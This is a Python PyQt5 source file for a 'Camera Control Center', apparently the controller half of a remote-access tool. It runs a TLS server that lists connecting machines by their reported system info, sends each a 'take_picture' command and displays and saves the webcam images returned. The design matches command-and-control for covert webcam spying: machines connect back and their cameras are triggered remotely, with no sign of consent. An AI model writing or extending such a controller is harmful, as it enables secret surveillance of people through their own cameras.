import socket
import ssl
import threading
import struct
import sys
import os
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QListWidget, QPushButton,
                             QVBoxLayout, QHBoxLayout, QWidget, QLabel, QDialog,
                             QListWidgetItem, QMessageBox, QFrame, QFileDialog)
from PyQt5.QtGui import QPixmap, QImage, QIcon
from PyQt5.QtCore import pyqtSignal, pyqtSlot, Qt, QSize

# --- إعدادات الخادم ---
HOST = '192.168.0.103'
PORT = 5555


class ImageViewer(QDialog):
    def __init__(self, client_info, image_data, parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Image from {client_info}")
        self.setMinimumSize(800, 600)

        self.client_info = client_info
        self.image_data = image_data
        self.is_valid_image = not self.image_data.startswith(b"Error:")

        self.init_ui()
        self.display_image()

    def init_ui(self):
        self.image_label = QLabel("Loading image...")
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: #1e1e1e; color: white;")

        self.save_button = QPushButton("Save Image")
        self.save_button.setStyleSheet("""
            QPushButton {
                background-color: #27ae60;
                color: white;
                font-size: 14px;
                font-weight: bold;
                border: none;
                border-radius: 5px;
                padding: 10px 15px;
                margin: 10px;
            }
            QPushButton:hover { background-color: #2ecc71; }
            QPushButton:pressed { background-color: #229954; }
            QPushButton:disabled { background-color: #566573; color: #95a5a6; }
        """)
        self.save_button.setEnabled(self.is_valid_image)
        self.save_button.clicked.connect(self.save_image_as)

        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        layout.addWidget(self.image_label, 1)
        layout.addWidget(self.save_button, 0, Qt.AlignRight)

        self.setLayout(layout)

    def display_image(self):
        if not self.is_valid_image:
            self.image_label.setText(f"Client Error:\n{self.image_data.decode('utf-8')}")
            return

        q_image = QImage.fromData(self.image_data, 'jpeg')
        if q_image.isNull():
            self.image_label.setText("Error: Invalid image data received.")
            self.save_button.setEnabled(False)
            return

        pixmap = QPixmap.fromImage(q_image)
        self.image_label.setPixmap(pixmap.scaled(self.image_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))

    def save_image_as(self):
        if not self.is_valid_image:
            return

        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        suggested_filename = f"{self.client_info}_{timestamp}.jpg"

        default_dir = os.path.join(os.path.expanduser('~'), 'Pictures')
        if not os.path.exists(default_dir):
            default_dir = os.path.expanduser('~')

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Image",
            os.path.join(default_dir, suggested_filename),
            "JPEG Images (*.jpg);;All Files (*)"
        )

        if file_path:
            try:
                with open(file_path, 'wb') as f:
                    f.write(self.image_data)
                print(f"[+] Image saved successfully to: {file_path}")
                QMessageBox.information(self, "Success", f"Image saved successfully to:\n{file_path}")
            except Exception as e:
                print(f"[!] Error saving image: {e}")
                QMessageBox.warning(self, "Error", f"Could not save the image.\nError: {e}")


class ControllerApp(QMainWindow):
    # ===================================================================
    new_client_signal = pyqtSignal(object, str)
    client_disconnected_signal = pyqtSignal(object)
    new_image_signal = pyqtSignal(object, bytes)

    # ===================================================================

    def __init__(self):
        super().__init__()
        self.setWindowTitle("Camera Control Center")
        self.setGeometry(100, 100, 800, 600)

        self.apply_stylesheet()

        self.sessions = {}
        self.current_session_sock = None

        self.init_ui()
        self.connect_signals()

        server_thread = threading.Thread(target=self.start_server)
        server_thread.daemon = True
        server_thread.start()

    def apply_stylesheet(self):
        self.setStyleSheet("""
            QMainWindow, QDialog {
                background-color: #2c3e50;
            }
            QLabel {
                color: #ecf0f1;
                font-size: 14px;
            }
            QListWidget {
                background-color: #34495e;
                color: #ecf0f1;
                border: 1px solid #2c3e50;
                border-radius: 5px;
                font-size: 16px;
                padding: 5px;
            }
            QListWidget::item:selected {
                background-color: #3498db;
                color: #ffffff;
            }
            QListWidget::item:hover {
                background-color: #4a627a;
            }
            QPushButton {
                background-color: #3498db;
                color: white;
                font-size: 16px;
                font-weight: bold;
                border: none;
                border-radius: 8px;
                padding: 12px 20px;
            }
            QPushButton:pressed {
                background-color: #2980b9;
            }
            QPushButton:disabled {
                background-color: #566573;
                color: #95a5a6;
            }
            QFrame {
                background-color: #34495e;
                border-radius: 8px;
            }
        """)

    def init_ui(self):
        main_layout = QHBoxLayout()
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(15)

        left_frame = QFrame()
        left_layout = QVBoxLayout(left_frame)
        left_layout.setContentsMargins(10, 10, 10, 10)

        clients_label = QLabel("Connected Clients")
        clients_label.setStyleSheet("font-size: 18px; font-weight: bold; margin-bottom: 5px;")

        self.client_list = QListWidget()

        left_layout.addWidget(clients_label)
        left_layout.addWidget(self.client_list)

        right_frame = QFrame()
        right_layout = QVBoxLayout(right_frame)
        right_layout.setContentsMargins(20, 20, 20, 20)
        right_layout.setSpacing(15)

        control_label = QLabel("Control Panel")
        control_label.setStyleSheet("font-size: 18px; font-weight: bold; margin-bottom: 5px;")

        self.selected_client_label = QLabel("No client selected")
        self.selected_client_label.setAlignment(Qt.AlignCenter)
        self.selected_client_label.setStyleSheet("background-color: #2c3e50; border-radius: 5px; padding: 8px;")

        self.capture_button = QPushButton("Capture Webcam Image")

        self.capture_button.setEnabled(False)

        right_layout.addWidget(control_label)
        right_layout.addWidget(self.selected_client_label)
        right_layout.addStretch(1)
        right_layout.addWidget(self.capture_button)
        right_layout.addStretch(3)

        main_layout.addWidget(left_frame, 2)
        main_layout.addWidget(right_frame, 1)

        central_widget = QWidget()
        central_widget.setLayout(main_layout)
        self.setCentralWidget(central_widget)

    def connect_signals(self):
        self.client_list.itemClicked.connect(self.select_client)
        self.capture_button.clicked.connect(self.request_picture)

        self.new_client_signal.connect(self.add_client_to_list)
        self.client_disconnected_signal.connect(self.remove_client_from_list)
        self.new_image_signal.connect(self.display_image)

    def start_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        try:
            context.load_cert_chain(certfile='server.crt', keyfile='server.key')
        except FileNotFoundError:
            print("[FATAL ERROR] server.crt or server.key not found!")
            return

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[*] Controller listening on {HOST}:{PORT}...")

        while True:
            try:
                client_socket, addr = server_socket.accept()
                secure_sock = context.wrap_socket(client_socket, server_side=True)
                handler_thread = threading.Thread(target=self.handle_client, args=(secure_sock, addr))
                handler_thread.daemon = True
                handler_thread.start()
            except Exception as e:
                print(f"[ERROR] Server accept loop error: {e}")

    def handle_client(self, client_sock, addr):
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        try:
            while True:
                header_bytes = client_sock.recv(14)
                if not header_bytes: break

                msg_type = header_bytes[:10].strip()
                msg_size = struct.unpack('<L', header_bytes[10:])[0]

                data = b''
                while len(data) < msg_size:
                    chunk = client_sock.recv(min(msg_size - len(data), 4096))
                    if not chunk: break
                    data += chunk

                if msg_type == b'SYS_INFO':
                    client_info = data.decode('utf-8')
                    self.new_client_signal.emit(client_sock, client_info)
                elif msg_type == b'IMG_DATA':
                    self.new_image_signal.emit(client_sock, data)
                elif msg_type == b'PING':
                    pass

        except (ConnectionResetError, ssl.SSLEOFError, struct.error) as e:
            print(f"[-] Client {addr[0]} disconnected. Reason: {e}")
        finally:
            self.client_disconnected_signal.emit(client_sock)
            client_sock.close()

    @pyqtSlot(object, str)
    def add_client_to_list(self, client_sock, client_info):
        item = QListWidgetItem(client_info)
        self.sessions[client_sock] = {'info': client_info, 'item': item}
        self.client_list.addItem(item)

    @pyqtSlot(object)
    def remove_client_from_list(self, client_sock):
        if client_sock in self.sessions:
            session = self.sessions.pop(client_sock)
            self.client_list.takeItem(self.client_list.row(session['item']))
            if self.current_session_sock == client_sock:
                self.current_session_sock = None
                self.capture_button.setEnabled(False)
                self.selected_client_label.setText("No client selected")

    def select_client(self, item):
        for sock, session in self.sessions.items():
            if session['item'] == item:
                self.current_session_sock = sock
                self.selected_client_label.setText(f"Selected: {session['info']}")
                self.capture_button.setEnabled(True)
                break

    def request_picture(self):
        if self.current_session_sock:
            print(f"[CMD] Sending 'take_picture' to {self.sessions[self.current_session_sock]['info']}")
            try:
                self.current_session_sock.sendall(b'take_picture')
            except (ConnectionResetError, BrokenPipeError) as e:
                print(f"[ERROR] Failed to send command: {e}")
                self.client_disconnected_signal.emit(self.current_session_sock)

    @pyqtSlot(object, bytes)
    def display_image(self, client_sock, image_data):
        if client_sock in self.sessions:
            client_info = self.sessions[client_sock]['info']
            viewer = ImageViewer(client_info, image_data, self)
            viewer.exec_()

    def closeEvent(self, event):
        for sock in list(self.sessions.keys()):
            try:
                sock.close()
            except:
                pass
        event.accept()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_win = ControllerApp()
    main_win.show()
    sys.exit(app.exec_())
